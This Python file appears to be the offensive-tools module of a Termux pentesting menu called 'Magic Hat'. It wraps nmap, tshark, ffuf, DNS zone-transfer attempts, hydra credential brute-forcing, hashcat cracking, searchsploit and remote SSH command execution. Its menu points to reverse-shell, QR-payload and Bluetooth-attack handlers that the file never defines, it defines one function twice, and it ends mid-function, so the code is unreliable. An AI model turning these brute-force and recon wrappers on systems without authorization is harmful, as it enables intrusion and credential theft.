"""Offensive security tool execution handlers and loggers for Magic Hat."""

import os
import shutil
import subprocess
import re
from magic_hat.database import log_scan, get_scan_logs, get_connection
from magic_hat.utils import BANNER_IMAGE, clear_screen, get_all_device_ips, print_tactical_header, get_subnet_range, send_webhook_notification
import qrcode  # Requires: pip install qrcode
import socket

def display_offensive_suite():
    while True:
        clear_screen()
        print(BANNER_IMAGE)
        print("       === OFFENSIVE & TACTICAL DEPLOYMENT SUITE ===")
        print("=" * 60)
        print("                  --- RECON & PROFILING ---")
        print("-" * 60)
        print("1. Nmap Deep Recon & Target Profiler")
        print("2. Net Shark Packet Capture (tshark)")
        print("3. Web Directory Fuzzer (ffuf)")
        print("4. DNS Footprinting (dig)")
        print("5. Web Tech Stack Fingerprinting (whatweb)")
        print("6. Wireless & RF Footprinting")
        print("-" * 60)
        print("              --- AUDITING & EXPLOITATION ---")
        print("-" * 60)
        print("7. SSH & PowerShell Remote Auditors")
        print("8. Hash Identifier & Cracking Assistant")
        print("9. Exploit Database Search (searchsploit)")
        print("10. Credential Service Auditor (hydra)")
        print("-" * 60)
        print("             --- TACTICAL DEPLOYMENT & UTILS ---")
        print("-" * 60)
        print("11. Cryptographic Engine (Base64/XOR)")
        print("12. Tactical Reverse Shell Generator")
        print("13. ASCII QR Code Payload Generator")
        print("14. Bluetooth Attack & SDP Suite")
        print("15. Wireless Monitor Mode Manager")
        print("16. Wordlist Manager")
        print("-" * 60)
        print("99. Back to Lifecycle Menu (b)")
        print("=" * 60)
        
        choice = input("Select tactical module [1-16, or 99/b]: ").strip().lower()
        if choice in ["99", "b", "back"]:
            break
        elif choice == "1":
            handle_nmap_menu()
        elif choice == "2":
            handle_net_shark()
        elif choice == "3":
            handle_web_fuzzer()
        elif choice == "4":
            handle_dns_recon()
        elif choice == "5":
            handle_tech_fingerprint()
        elif choice == "6":
            handle_wireless_recon()
        elif choice == "7":
            handle_ssh_audit()
        elif choice == "8":
            handle_hash_identifier()
        elif choice == "9":
            handle_exploit_search()
        elif choice == "10":
            handle_hydra_audit()
        elif choice == "11":
            handle_crypto_engine()
        elif choice == "12":
            handle_payload_generator()
        elif choice == "13":
            handle_qr_exploit()
        elif choice == "14":
            handle_bluetooth_attacks()
        elif choice == "15":
            handle_monitor_mode()
        elif choice == "16":
            handle_wordlist_manager()
        else:
            input("Invalid choice! Press Enter to try again...")

def parse_open_ports(nmap_output):
    """Extract open ports and services from Nmap stdout using regex."""
    open_ports = []
    pattern = re.compile(r"^(\d+/(?:tcp|udp))\s+open\s+([^\s]+)\s*(.*)$", re.MULTILINE)
    matches = pattern.findall(nmap_output)
    for port_proto, service, desc in matches:
        open_ports.append({"port": port_proto, "service": service.strip()})
    return open_ports

def parse_nmap_deep_telemetry(nmap_output):
    """Extract open ports, services, OS hints, and MAC addresses from Nmap stdout."""
    telemetry = {
        "open_ports": [],
        "os_guess": "Unknown / Not Detected",
        "mac_address": "Unknown",
        "device_type": "Unknown"
    }
    
    # Parse open ports & services
    port_pattern = re.compile(r"^(\d+/(?:tcp|udp))\s+open\s+([^\s]+)\s*(.*)$", re.MULTILINE)
    for port_proto, service, desc in port_pattern.findall(nmap_output):
        telemetry["open_ports"].append({"port": port_proto, "service": service.strip(), "details": desc.strip()})
        
    # Parse OS detection hints
    os_pattern = re.compile(r"OS details:\s+(.*)$", re.MULTILINE)
    os_match = os_pattern.search(nmap_output)
    if os_match:
        telemetry["os_guess"] = os_match.group(1).strip()
    else:
        running_pattern = re.compile(r"Running:\s+(.*)$", re.MULTILINE)
        running_match = running_pattern.search(nmap_output)
        if running_match:
            telemetry["os_guess"] = running_match.group(1).strip()

    # Parse MAC address & Vendor
    mac_pattern = re.compile(r"MAC Address:\s+([0-9A-Fa-f:]+\s+\([^)]+\))", re.MULTILINE)
    mac_match = mac_pattern.search(nmap_output)
    if mac_match:
        telemetry["mac_address"] = mac_match.group(1).strip()
        
    return telemetry

def handle_nmap_menu():
    """Interactive Nmap scan selection and execution menu with deep target profiling."""
    while True:
        clear_screen()
        print(BANNER_IMAGE)
        print_tactical_header()
        print("       === PAGE: NMAP DEEP RECON & TARGET PROFILER ===")
        print("-" * 60)
        print("1. Quick Port Scan (-T4)")
        print("2. Service & Version Detection (-sV -T4)")
        print("3. Comprehensive Target Profile (OS, Scripts, Versions: -A -sC -T4)")
        print("4. Full Port Sweep (-p- -T4)")
        print("5. Custom Flags")
        print("99. Back to Suite Menu (b)")
        print("-" * 60)
        
        choice = input("Select profile [1-5, or 99/b]: ").strip().lower()
        if choice in ["99", "b", "back"]:
            break
            
        target = input("Enter target IP, hostname, or CIDR (or 'b' to back): ").strip()
        if target.lower() in ["b", "99", "back", ""]:
            continue
            
        flags = ["-T4"]
        if choice == "1":
            flags = ["-T4"]
        elif choice == "2":
            flags = ["-sV", "-T4"]
        elif choice == "3":
            flags = ["-A", "-sC", "-T4"]  # Aggressive + Script scan + OS detection
        elif choice == "4":
            flags = ["-p-", "-T4"]
        elif choice == "5":
            custom = input("Enter custom nmap arguments (e.g., -p 1-1000 -O): ").strip()
            if custom.lower() in ["b", "99", "back"]:
                continue
            flags = custom.split()
        else:
            input("Invalid selection! Press Enter to continue...")
            continue
            
        print(f"\n[+] Launching Nmap target profiler on {target} with flags: {' '.join(flags)}")
        print("[*] Performing deep enumeration (this may take a moment)...")
        try:
            cmd = ["nmap"] + flags + [target]
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            output = result.stdout
            
            # Extract structured telemetry
            telemetry = parse_nmap_deep_telemetry(output)
            
            clear_screen()
            print(BANNER_IMAGE)
            print_tactical_header()
            print(f"=== DEEP RECON REPORT: {target} ===")
            print("-" * 60)
            print(f"[*] Target OS Guess : {telemetry['os_guess']}")
            print(f"[*] MAC / Hardware  : {telemetry['mac_address']}")
            print("-" * 60)
            
            if telemetry["open_ports"]:
                print(f"{'PORT/PROTO':<12} | {'SERVICE':<15} | {'VERSION / DETAILS'}")
                print("-" * 60)
                for p in telemetry["open_ports"]:
                    print(f"{p['port']:<12} | {p['service']:<15} | {p['details']}")
            else:
                print("[*] Raw scan output (no standard ports parsed):")
                print(output[:1500])
            print("-" * 60)
            
            # Log scan with structured metadata for reporting and dashboard
            log_scan("Nmap Deep Recon", target, output, metadata=telemetry)
            print("[✔] Rich target profile logged successfully to database.")
        except subprocess.CalledProcessError as e:
            print(f"\n[-] Nmap failed: {e.stderr or str(e)}")
        except FileNotFoundError:
            print("\n[-] Error: 'nmap' binary not found. Run 'pkg install nmap'.")
            
        input("\nPress Enter to return...")

def handle_net_shark():
    """Tool 2: Net Shark (Packet Capture / tshark)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("=== PAGE: NET SHARK (PACKET CAPTURE) ===")
    
    ips = get_all_device_ips()
    print("[*] Available Interfaces:")
    for iface, ip in ips:
        print(f"    - {iface} ({ip})")
    print("-" * 60)
    
    iface = input("Enter interface to sniff (e.g., wlan0, rmnet0) or 'b' to back: ").strip()
    if iface.lower() in ["b", "99", "back", ""]:
        return
        
    count = input("Enter packet count limit (default 20): ").strip() or "20"
    
    print(f"\n[+] Initializing Net Shark on {iface} (capturing {count} packets)...")
    print("[*] Press Ctrl+C if you need to abort early.\n")
    try:
        cmd = ["tshark", "-i", iface, "-c", str(count)]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print_tactical_header()
        print(f"=== PACKET CAPTURE RESULTS: {iface} ===")
        print(output)
        
        log_scan("Net Shark", iface, output)
        print("\n[✔] Packet capture logged to database.")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] Tshark failed: {e.stderr or str(e)}")
        print("[-] Note: Sniffing cellular interfaces (like rmnet0) requires root privileges.")
    except FileNotFoundError:
        print("\n[-] Error: 'tshark' not found in path. Run 'pkg install tshark'.")
        
    input("\nPress Enter to return...")

def handle_web_fuzzer():
    """Tool 3: Web Directory Fuzzer (ffuf wrapper)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("             === PAGE: WEB DIR FUZZER (FFUF) ===")
    print("-" * 60)
    
    url = input("Enter target URL (e.g., http://10.0.0.1/FUZZ) or 'b' to back: ").strip()
    if url.lower() in ["b", "99", "back", ""]:
        return
        
    if "FUZZ" not in url:
        print("[!] Note: 'FUZZ' keyword missing in URL. Appending '/FUZZ'.")
        url = url.rstrip("/") + "/FUZZ"
        
    wordlist = input("Enter wordlist path (default: /data/data/com.termux/files/usr/share/wordlists/dirb/common.txt): ").strip()
    if not wordlist:
        wordlist = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
        
    print(f"\n[+] Launching FFUF fuzzer against {url}...")
    try:
        cmd = ["ffuf", "-u", url, "-w", wordlist, "-s"]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== FFUF DISCOVERY RESULTS ===")
        print(output if output else "[*] Scan completed, but no standard output captured.")
        
        log_scan("Web Fuzzer", url, output)
        print("\n[✔] Web fuzzing results successfully logged to database.")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] FFUF failed: {e.stderr or str(e)}")
    except FileNotFoundError:
        print("\n[-] Error: 'ffuf' binary not found. Run 'pkg install ffuf'.")
        
    input("\nPress Enter to return...")

def handle_dns_recon():
    """Tool 4: DNS Recon (dig wrapper)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("            === PAGE: DNS FOOTPRINTING (DIG) ===")
    print("-" * 60)
    
    domain = input("Enter target domain or hostname (or 'b' to back): ").strip()
    if domain.lower() in ["b", "99", "back", ""]:
        return
        
    print("Select Record Query Type:")
    print("1. Standard Query (A, MX, NS)")
    print("2. All Records (ANY)")
    print("3. Zone Transfer Attempt (AXFR)")
    
    choice = input("Select query type [1-3]: ").strip()
    qtype = ""
    if choice == "2":
        qtype = "ANY"
    elif choice == "3":
        qtype = "AXFR"
        
    print(f"\n[+] Querying DNS records for {domain}...")
    try:
        cmd = ["dig", domain]
        if qtype:
            cmd.append(qtype)
            
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== DNS RESULTS ({domain}) ===")
        print(output)
        
        log_scan("DNS Recon", domain, output)
        print("\n[✔] DNS footprint logged to database.")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] Dig failed: {e.stderr or str(e)}")
    except FileNotFoundError:
        print("\n[-] Error: 'dig' binary not found. Run 'pkg install dnsutils'.")
        
    input("\nPress Enter to return...")

def handle_tech_fingerprint():
    """Tool 5: Web Tech Fingerprinting (whatweb wrapper)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("        === PAGE: WEB TECH FINGERPRINT (WHATWEB) ===")
    print("-" * 60)
    
    target = input("Enter target URL or IP (or 'b' to back): ").strip()
    if target.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"\n[+] Fingerprinting technology stack for {target}...")
    try:
        cmd = ["whatweb", target]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== TECH STACK REPORT: {target} ===")
        print(output)
        
        log_scan("Tech Fingerprint", target, output)
        print("\n[✔] Fingerprint results logged to database.")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] WhatWeb failed: {e.stderr or str(e)}")
    except FileNotFoundError:
        print("\n[-] Error: 'whatweb' binary not found. Ensure it is installed in Termux.")
        
    input("\nPress Enter to return...")

def handle_subnet_sweep():
    """Tool 6: Local Subnet Discovery & ARP Sweeping."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("            === PAGE: SUBNET & ARP DISCOVERY ===")
    print("-" * 60)
    
    ips = get_all_device_ips()
    default_sub = "192.168.1.0/24"
    if ips:
        _, ip_c = ips[0]
        default_sub = get_subnet_range(ip_c)
        
    subnet = input(f"Enter target CIDR [default {default_sub}] or 'b' to back: ").strip()
    if subnet.lower() in ["b", "99", "back"]:
        return
    target_sub = subnet if subnet else default_sub
        
    print(f"\n[+] Sweeping subnet {target_sub} for live hosts...")
    try:
        cmd = ["nmap", "-sn", target_sub]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print_tactical_header()
        print(f"=== LIVE HOST DISCOVERY: {target_sub} ===")
        print(output)
        
        log_scan("Subnet Sweep", target_sub, output)
        send_webhook_notification("Subnet Sweep Complete", f"Discovered live hosts on {target_sub}")
        print("\n[✔] Sweep results logged and webhook triggered.")
    except Exception as e:
        print(f"\n[-] Sweep failed: {e}")
        
    input("\nPress Enter to return...")

def handle_wireless_recon():
    """Tool 7: Wireless & RF Footprinting Wrapper."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("            === PAGE: WIRELESS & RF FOOTPRINTING ===")
    print("-" * 60)
    print("1. List Wireless Interfaces & Status (iw / nmcli)")
    print("2. Scan Nearby Wi-Fi Networks")
    print("99. Back to Suite Menu (b)")
    print("-" * 60)
    
    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
    elif choice == "1":
        cmd = ["iw", "dev"]
    elif choice == "2":
        cmd = ["nmcli", "dev", "wifi"]
    else:
        return
        
    print("\n[+] Querying wireless subsystem...")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print_tactical_header()
        print("=== WIRELESS RECON REPORT ===")
        print(output if output else "[*] Command executed but returned no output.")
        
        log_scan("Wireless Recon", "Local RF", output)
        print("\n[✔] Wireless telemetry logged to database.")
    except Exception as e:
        print(f"\n[-] Wireless command failed: {e}")
        
    input("\nPress Enter to return...")

def handle_hash_identifier():
    """Tool 8: Hash Identification & Cracking Assistant."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("=== PAGE: HASH IDENTIFIER & AUDIT ===")
    print("-" * 60)
    
    hash_str = input("Enter hash string to analyze (or 'b' to back): ").strip()
    if hash_str.lower() in ["b", "99", "back", ""]:
        return
        
    length = len(hash_str)
    identified = []
    
    if length == 32 and re.match(r"^[a-fA-F0-9]{32}$", hash_str):
        identified.append("MD5 / NTLM / MD4")
    elif length == 40 and re.match(r"^[a-fA-F0-9]{40}$", hash_str):
        identified.append("SHA-1 / MySQL")
    elif length == 64 and re.match(r"^[a-fA-F0-9]{64}$", hash_str):
        identified.append("SHA-256 / WPA-PSK TKIP")
    elif hash_str.startswith("$2a$") or hash_str.startswith("$2b$") or hash_str.startswith("$2y$"):
        identified.append("Bcrypt (Blowfish)")
    elif hash_str.startswith("$6$"):
        identified.append("SHA-512 Crypt (Linux)")
    else:
        identified.append("Unknown or complex hash format")
        
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("=== HASH ANALYSIS RESULTS ===")
    print(f"[*] Input Hash: {hash_str}")
    print(f"[*] Length: {length} characters")
    print("[*] Potential Formats:")
    for fmt in identified:
        print(f"    - {fmt}")
    print("-" * 60)
    
    run_crack = input("Would you like to invoke hashcat against this hash? (y/n): ").strip().lower()
    if run_crack == 'y':
        mode = input("Enter hashcat mode number (e.g., 0 for MD5, 1000 for NTLM): ").strip()
        wordlist = input("Enter wordlist path: ").strip()
        if mode and wordlist:
            print("\n[+] Launching hashcat audit...")
            try:
                cmd = ["hashcat", "-a", "0", "-m", mode, hash_str, wordlist]
                res = subprocess.run(cmd, capture_output=True, text=True, check=True)
                print(res.stdout)
                log_scan("Hash Audit", hash_str, res.stdout)
            except Exception as e:
                print(f"[-] Hashcat execution failed: {e}")
                
    input("\nPress Enter to return...")

def handle_exploit_search():
    """Tool 9: Exploit Search Engine (searchsploit wrapper)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("             === PAGE: EXPLOIT SEARCH ENGINE ===")
    print("-" * 60)
    
    query = input("Enter service or software version (e.g., 'apache 2.4', 'vsftpd 2.3.4') or 'b' to back: ").strip()
    if query.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"\n[+] Querying local exploit database for '{query}'...")
    try:
        cmd = ["searchsploit", query]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== EXPLOIT RESULTS: {query} ===")
        print(output)
        
        log_scan("Exploit Search", query, output)
        print("\n[✔] Exploit search results logged to database.")
    except FileNotFoundError:
        print("\n[-] Error: 'searchsploit' binary not found. Install exploitdb.")
    except Exception as e:
        print(f"\n[-] Searchsploit failed: {e}")
        
    input("\nPress Enter to return...")

def handle_hydra_audit():
    """Tool 10: Credential & Service Auditor (hydra wrapper)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("          === PAGE: CREDENTIAL AUDITOR (HYDRA) ===")
    print("-" * 60)
    
    target = input("Enter target IP/hostname (or 'b' to back): ").strip()
    if target.lower() in ["b", "99", "back", ""]:
        return
    service = input("Enter service protocol (ssh, ftp, http-post-form): ").strip()
    user = input("Enter username or user file path: ").strip()
    wordlist = input("Enter password wordlist path: ").strip()
    
    if not all([target, service, user, wordlist]):
        input("\n[-] All fields are required. Press Enter to return...")
        return
        
    print(f"\n[+] Launching Hydra brute-force audit against {target} ({service})...")
    try:
        cmd = ["hydra", "-l", user, "-P", wordlist, target, service]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== HYDRA AUDIT RESULTS ===")
        print(output)
        
        log_scan("Hydra Audit", f"{service}://{target}", output)
        print("\n[✔] Credential audit logged to database.")
    except Exception as e:
        print(f"\n[-] Hydra execution failed: {e}")
        
    input("\nPress Enter to return...")

def handle_wireless_bt_scanner():
    """Option 1: Scan nearby Wi-Fi networks and Bluetooth devices using Termux API or binaries."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("    === OPTION 1: WIRELESS & BLUETOOTH AIRSPACE SCAN ===")
    print("-" * 60)
    
    print("[*] Scanning nearby Wi-Fi access points...")
    wifi_output = ""
    try:
        res = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=5)
        if res.returncode == 0 and res.stdout.strip() and "[]" not in res.stdout:
            wifi_output = res.stdout
    except Exception:
        pass
        
    if not wifi_output:
        try:
            res = subprocess.run(["nmcli", "dev", "wifi"], capture_output=True, text=True, timeout=5)
            wifi_output = res.stdout
        except Exception:
            try:
                res = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                wifi_output = res.stdout
            except Exception:
                pass
                
    if wifi_output.strip():
        print(wifi_output)
    else:
        print("[-] Wi-Fi scan returned no data. (Tip: Install 'termux-api' package & app).")

    print("\n" + "=" * 60)
    print("[*] Scanning nearby Bluetooth devices...")
    bt_output = ""
    try:
        res = subprocess.run(["termux-bluetooth-devices"], capture_output=True, text=True, timeout=5)
        if res.returncode == 0 and res.stdout.strip() and "[]" not in res.stdout:
            bt_output = res.stdout
    except Exception:
        pass
        
    if not bt_output:
        try:
            res = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=6)
            bt_output = res.stdout
        except Exception:
            pass
            
    if bt_output.strip():
        print(bt_output)
    else:
        print("[-] Bluetooth scan returned no data. Ensure Bluetooth is enabled.")
        
    log_scan("Wireless & BT Scanner", "Local Airspace", "Executed airspace scan via Termux API/binaries")
    input("\nPress Enter to return to main menu...")

def handle_subnet_sweep_tool():
    """Option 2: Whole Subnet Host Sweep (Active Discovery)."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("         === OPTION 2: WHOLE SUBNET HOST SWEEP ===")
    print("-" * 60)
    
    ips = get_all_device_ips()
    default_subnet = "192.168.1.0/24"
    if ips:
        _, ip_cidr = ips[0]
        default_subnet = get_subnet_range(ip_cidr)
        
    subnet = input(f"Enter subnet/CIDR [default {default_subnet}] (or 'b' to back): ").strip()
    if subnet.lower() in ["b", "99", "back"]:
        return
    target_subnet = subnet if subnet else default_subnet
    
    print(f"\n[+] Executing active ping/ARP sweep on host space: {target_subnet}...")
    try:
        cmd = ["nmap", "-sn", target_subnet]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(res.stdout)
        log_scan("Subnet Sweep", target_subnet, res.stdout)
    except Exception as e:
        print(f"\n[-] Subnet sweep failed: {e}")
        
    input("\nPress Enter to return to main menu...")
            
def handle_view_logs():
    """Display past scan logs stored in the database and view full output."""
    while True:
        clear_screen()
        print(BANNER_IMAGE)
        print("                === SCAN ARCHIVES (LOGS) ===")
        print("-" * 60)
        
        logs = get_scan_logs()
        if not logs:
            print("No scan logs found in the archives yet.")
            input("\nPress Enter to return to the main menu...")
            break
            
        print(f"{'ID':<4} | {'Tool':<16} | {'Target':<15} | {'Timestamp'}")
        print("-" * 60)
        for log in logs:
            print(f"{log['id']:<4} | {log['tool_name']:<16} | {log['target']:<15} | {log['timestamp']}")
            
        print("-" * 60)
        view_id = input("Enter log ID to view full output (or press Enter to go back): ").strip()
        if not view_id:
            break
            
        if view_id.isdigit():
            with get_connection() as conn:
                row = conn.execute("SELECT tool_name, target, timestamp, output FROM scan_logs WHERE id = ?", (view_id,)).fetchone()
                if row:
                    clear_screen()
                    print(BANNER_IMAGE)
                    print(f"=== LOG DETAILS [ID: {view_id}] ===")
                    print(f"Tool:   {row['tool_name']}")
                    print(f"Target: {row['target']}")
                    print(f"Time:   {row['timestamp']}")
                    print("-" * 60)
                    print(row['output'])
                    print("-" * 60)
                else:
                    print("\n[-] Error: Log ID not found.")
            input("\nPress Enter to continue...")
        else:
            print("\n[-] Invalid input. Please enter a numeric ID.")
            input("\nPress Enter to continue...")

def handle_ssh_audit():
    """Tool: SSH Remote Execution & Banner/Key Auditor."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("    === PAGE: SSH AUDITOR & REMOTE ACCESS ===")
    print("-" * 60)
    
    target = input("Enter target IP/hostname (or 'b' to back): ").strip()
    if target.lower() in ["b", "99", "back", ""]:
        return
        
    port = input("Enter SSH port [default 22]: ").strip() or "22"
    user = input("Enter SSH username [default root]: ").strip() or "root"
    
    print("\nSelect Action:")
    print("1. Audit Banner & Key Exchange Algorithms (ssh-keyscan)")
    print("2. Test Remote SSH Interactive Connection")
    print("3. Execute Single Remote Command")
    
    choice = input("Select action [1-3]: ").strip()
    
    if choice == "1":
        print(f"\n[+] Querying SSH key signatures for {target}:{port}...")
        try:
            cmd = ["ssh-keyscan", "-p", port, target]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = res.stdout if res.stdout else res.stderr
            
            clear_screen()
            print(BANNER_IMAGE)
            print(f"=== SSH KEYSCAN TELEMETRY: {target} ===")
            print(output)
            
            log_scan("SSH Keyscan", f"{target}:{port}", output)
            print("\n[✔] SSH key telemetry logged to database.")
        except Exception as e:
            print(f"\n[-] SSH keyscan failed: {e}")
            
    elif choice == "2":
        print(f"\n[+] Spawning interactive SSH session to {user}@{target}:{port}...")
        try:
            subprocess.run(["ssh", "-p", port, f"{user}@{target}"])
        except Exception as e:
            print(f"\n[-] Interactive SSH failed: {e}")
            
    elif choice == "3":
        remote_cmd = input("Enter remote command to execute: ").strip()
        if remote_cmd:
            print(f"\n[+] Executing '{remote_cmd}' on {target}...")
            try:
                cmd = ["ssh", "-p", port, f"{user}@{target}", remote_cmd]
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                output = res.stdout
                print(output)
                log_scan("SSH Remote Exec", f"{user}@{target}", output)
            except Exception as e:
                print(f"\n[-] Remote command failed: {e}")
                
    input("\nPress Enter to return...")

def handle_powershell_audit():
    """Tool: PowerShell Core (pwsh) & WinRM Remote Management."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("       === PAGE: POWERSHELL CORE & WINRM AUDITOR ===")
    print("-" * 60)
    
    if not shutil.which("pwsh"):
        print("\n[-] Notice: 'pwsh' (PowerShell Core) binary is not installed in this environment.")
        print("[*] To install in Termux: `pkg install powershell` (if available for your arch).")
        print("[*] Alternatively, use WinRM to target remote Windows hosts from an external controller.")
        input("\nPress Enter to return...")
        return

    print("Select Mode:")
    print("1. Run Local PowerShell Command / One-Liner (pwsh -c)")
    print("2. WinRM Remote Query (WS-Man / Windows Hosts)")
    print("99. Back (b)")
    print("-" * 60)
    
    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        ps_cmd = input("Enter PowerShell command: ").strip()
        if not ps_cmd:
            return
        try:
            cmd = ["pwsh", "-NoProfile", "-NonInteractive", "-Command", ps_cmd]
            res = subprocess.run(cmd, capture_output=True, text=True, check=True)
            clear_screen()
            print(BANNER_IMAGE)
            print("=== POWERSHELL EXECUTION OUTPUT ===")
            print(res.stdout)
            log_scan("PowerShell Command", "Local Host", res.stdout)
        except Exception as e:
            print(f"\n[-] PowerShell execution failed: {e}")
            
    input("\nPress Enter to return...")

def handle_wireless_recon():
    """Tool: Wireless & RF Footprinting with fallback interface checks."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("     === PAGE: WIRELESS & RF FOOTPRINTING ===")
    print("-" * 60)
    print("1. List Wireless Interfaces & Status (iw / nmcli / ip link)")
    print("2. Scan Nearby Wi-Fi Networks")
    print("99. Back to Suite Menu (b)")
    print("-" * 60)
    
    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    output = ""
    if choice == "1":
        print("\n[+] Querying wireless subsystem...")
        try:
            if shutil.which("iw"):
                res = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
                output = res.stdout
            elif shutil.which("nmcli"):
                res = subprocess.run(["nmcli", "device", "wifi"], capture_output=True, text=True, check=True)
                output = res.stdout
            elif shutil.which("ip"):
                res = subprocess.run(["ip", "link"], capture_output=True, text=True, check=True)
                output = "[*] 'iw' and 'nmcli' not found in sandbox. Fallback to system network links:\n" + res.stdout
            else:
                output = "[-] No wireless control binaries (iw, nmcli) or ip tools found in environment."
        except Exception as e:
            output = f"[-] Wireless query failed: {e}"
            
    elif choice == "2":
        print("\n[+] Scanning nearby Wi-Fi networks...")
        try:
            if shutil.which("nmcli"):
                res = subprocess.run(["nmcli", "device", "wifi", "list"], capture_output=True, text=True, check=True)
                output = res.stdout
            else:
                output = "[-] Wi-Fi scanner ('nmcli') requires NetworkManager daemon, which is restricted in Termux without root/proot."
        except Exception as e:
            output = f"[-] Wi-Fi scan failed: {e}"
            
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("=== WIRELESS / RF TELEMETRY ===")
    print(output)
    log_scan("Wireless Recon", "Airspace", output)
    input("\nPress Enter to return...")

def handle_monitor_mode():
    """Hardware Tool: Toggle wireless interface monitor mode via airmon-ng or iwconfig."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("        === WIRELESS MONITOR MODE & DONGLE MANAGER ===")
    print("-" * 60)
    print("1. Check Wireless Interfaces (airmon-ng / iwconfig)")
    print("2. Enable Monitor Mode on Interface (e.g., wlan0)")
    print("3. Disable Monitor Mode")
    print("99. Back (b)")
    print("-" * 60)
    
    choice = input("Select option [1-3, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
    elif choice == "1":
        try:
            res = subprocess.run(["airmon-ng"], capture_output=True, text=True, check=True)
            print(res.stdout)
        except Exception:
            try:
                res = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
                print(res.stdout)
            except Exception as e:
                print(f"[-] Wireless query failed: {e}")
    elif choice == "2":
        iface = input("Enter interface name to put into monitor mode (e.g., wlan0): ").strip()
        if iface:
            try:
                subprocess.run(["airmon-ng", "start", iface], check=True)
                print(f"\n[✔] Monitor mode enabled.")
            except Exception as e:
                print(f"[-] Failed to start monitor mode: {e}")
    elif choice == "3":
        iface = input("Enter monitor interface name to stop (e.g., wlan0mon): ").strip()
        if iface:
            try:
                subprocess.run(["airmon-ng", "stop", iface], check=True)
                print(f"\n[✔] Monitor mode stopped.")
            except Exception as e:
                print(f"[-] Failed to stop monitor mode: {e}")
    input("\nPress Enter to return...")

def handle_wordlist_manager():
    """Integrated Wordlist Manager: Verify and sync standard wordlists."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("            === INTEGRATED WORDLIST MANAGER ===")
    print("-" * 60)
    wordlist_path = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
    print(f"[*] Default Wordlist Path: {wordlist_path}")
    
    exists = os.path.exists(wordlist_path)
    print(f"[*] Status: {'FOUND [✔]' if exists else 'MISSING [✘]'}")
    
    if not exists:
        print("\n[+] Creating standard fallback wordlist directory & file...")
        try:
            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
            sample_words = ["admin", "login", "dashboard", "api", "config.json", "secret", "backup", "test", "uploads", "wp-admin", "server-status"]
            with open(wordlist_path, "w") as wf:
                wf.write("\n".join(sample_words) + "\n")
            print("[✔] Fallback common wordlist created successfully!")
        except Exception as e:
            print(f"[-] Failed to create wordlist: {e}")
    else:
        print("[✔] Wordlist is verified and ready for FFUF and audit tools.")
        
    input("\nPress Enter to return...")
    
def handle_bluetooth_recon():
    """Tool: Bluetooth & BLE Airspace Mapping."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("            === BLUETOOTH & BLE AIRSPACE RECON ===")
    print("-" * 60)
    print("1. Scan Classic Bluetooth Devices (hcitool scan)")
    print("2. Scan BLE Devices (bluetoothctl scan le)")
    print("99. Back (b)")
    print("-" * 60)
    
